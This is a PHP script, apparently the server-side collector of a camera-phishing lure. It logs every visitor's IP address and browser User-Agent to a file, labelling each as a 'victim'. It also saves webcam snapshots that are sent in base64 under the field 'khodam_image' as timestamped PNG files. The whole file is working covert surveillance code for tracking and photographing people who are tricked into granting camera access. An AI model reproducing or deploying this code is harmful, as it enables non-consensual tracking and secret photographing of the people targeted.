<?php
// Simpan IP & User-Agent
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
}

$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);
fclose($fp);

// Simpan snapshot dari video
if (!empty($_POST['khodam_image'])) {
    $date = date('dMYHis');
    $imageData = $_POST['khodam_image'];
    $filteredData = substr($imageData, strpos($imageData, ",")+1);
    $unencodedData = base64_decode($filteredData);
    $fp2 = fopen('cam'.$date.'.png', 'wb');
    fwrite($fp2, $unencodedData);
    fclose($fp2);
}
exit();
?>
